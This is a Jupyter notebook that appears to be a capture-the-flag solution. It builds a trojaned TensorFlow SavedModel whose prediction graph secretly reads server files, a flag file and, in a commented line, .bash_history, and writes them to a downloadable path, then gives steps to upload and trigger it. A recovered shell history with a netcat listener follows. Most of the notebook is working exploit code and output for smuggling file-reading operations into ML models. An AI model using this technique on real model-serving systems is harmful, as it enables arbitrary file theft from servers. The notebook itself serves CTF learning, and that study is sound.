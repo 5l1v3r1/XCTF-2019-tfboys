{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## exploit"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "1. download origin tensorflow model from website.\n",
    "2. load model to see its structure."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "import tensorflow as tf\n",
    "import numpy as np\n",
    "\n",
    "origin_model = './'\n",
    "sess = tf.Session(graph=tf.Graph())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Restoring parameters from ./variables/variables\n"
     ]
    }
   ],
   "source": [
    "meta_graph_def = tf.saved_model.loader.load(sess, [tf.saved_model.SERVING], origin_model)\n",
    "signature = meta_graph_def.signature_def"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'serving_default': inputs {\n",
       "  key: \"input\"\n",
       "  value {\n",
       "    name: \"embedding_1_input:0\"\n",
       "    dtype: DT_FLOAT\n",
       "    tensor_shape {\n",
       "      dim {\n",
       "        size: -1\n",
       "      }\n",
       "      dim {\n",
       "        size: 512\n",
       "      }\n",
       "    }\n",
       "  }\n",
       "}\n",
       "outputs {\n",
       "  key: \"output\"\n",
       "  value {\n",
       "    name: \"dense_1/Sigmoid:0\"\n",
       "    dtype: DT_FLOAT\n",
       "    tensor_shape {\n",
       "      dim {\n",
       "        size: -1\n",
       "      }\n",
       "      dim {\n",
       "        size: 1\n",
       "      }\n",
       "    }\n",
       "  }\n",
       "}\n",
       "method_name: \"tensorflow/serving/predict\"\n",
       "}"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "signature"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "3. modify model structure, inject evil tensor.\n",
    "4. upload infected model to read flag then write the content into model/upload/saved_model.pb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "INFO:tensorflow:Restoring parameters from ./variables/variables\n",
      "INFO:tensorflow:No assets to save.\n",
      "INFO:tensorflow:No assets to write.\n",
      "INFO:tensorflow:SavedModel written to: evil_model2/saved_model.pb\n"
     ]
    }
   ],
   "source": [
    "with tf.Session(graph=tf.Graph()) as sess:\n",
    "\n",
    "    # Loader START\n",
    "    meta_graph_def = tf.saved_model.loader.load(sess, [tf.saved_model.SERVING], origin_model)\n",
    "    signature = meta_graph_def.signature_def\n",
    "\n",
    "    x = sess.graph.get_tensor_by_name('embedding_1_input:0') # comes from model signature above\n",
    "    y = sess.graph.get_tensor_by_name('dense_1/Sigmoid:0')\n",
    "    # Loader END\n",
    "\n",
    "\n",
    "    # EXP START\n",
    "#     reader = tf.read_file('/home/ubuntu/.bash_history') # information gathering\n",
    "    reader = tf.read_file('/home/ubuntu/web3/flag_3deaef310')\n",
    "    path = tf.constant(\"/home/ubuntu/web3/model/upload/saved_model.pb\") # file path comes from website\n",
    "\n",
    "    with tf.control_dependencies([tf.write_file(path,reader)]):\n",
    "        b = tf.constant(0.0,name='write')\n",
    "\n",
    "    y_exp = tf.add(y,b)\n",
    "    # EXP END\n",
    "\n",
    "\n",
    "    # Builder START\n",
    "    export_path = 'evil_model2'\n",
    "    builder = tf.saved_model.builder.SavedModelBuilder(export_path)\n",
    "\n",
    "    signature_inputs = {\n",
    "        'input': tf.saved_model.utils.build_tensor_info(x)\n",
    "    }\n",
    "\n",
    "    signature_outputs = {\n",
    "        'output': tf.saved_model.utils.build_tensor_info(y_exp) # assign y_exp as output node\n",
    "    } \n",
    "\n",
    "    classification_signature_def = tf.saved_model.signature_def_utils.build_signature_def(\n",
    "        inputs=signature_inputs,\n",
    "        outputs=signature_outputs,\n",
    "        method_name=tf.saved_model.signature_constants.CLASSIFY_METHOD_NAME)\n",
    "\n",
    "    builder.add_meta_graph_and_variables(\n",
    "        sess,\n",
    "        [tf.saved_model.tag_constants.SERVING],\n",
    "        signature_def_map={\n",
    "            'serving_default': classification_signature_def\n",
    "        }#,\n",
    "        #legacy_init_op=tf.group(tf.tables_initializer())\n",
    "    )\n",
    "\n",
    "    builder.save()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "* cd evil_model && zip -r evil_model.zip saved_model.pb variables/\n",
    "* then upload evil_model.zip in website frontpage.\n",
    "* put some string then click 'Submit' to trigger model.predict(). the injected tensor will read content from './flag' then write it to 'model/upload/saved_model.pb'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "5. click 'save' to download the current model which contains .bash_history\n",
    "\n",
    "```\n",
    "source anaconda3/bin/activate\n",
    "jupyter-notebook --ip 0.0.0.0 --port 18888\n",
    "ls\n",
    "python -V\n",
    "pip install tensorflow\n",
    "pip install keras\n",
    "ipython\n",
    "apt-get install git\n",
    "sudo apt-get install git\n",
    "curl myip.ipip.net\n",
    "nc -lvp 9999 > web3.zip\n",
    "ls\n",
    "unzip web3.zip\n",
    "ls\n",
    "cp -r model/ web3/\n",
    "cp -r build/ web3/\n",
    "cd web3/\n",
    "ls\n",
    "vi flag_3deaef310\n",
    "python run.py\n",
    "```\n",
    "\n",
    "here we see how administrator deploy the website. also, flag in /home/ubuntu/web3/flag_3deaef310"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "6. Deploy another attack to read flag.\n",
    "`tf.read_file('/home/ubuntu/web3/flag_3deaef310')`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
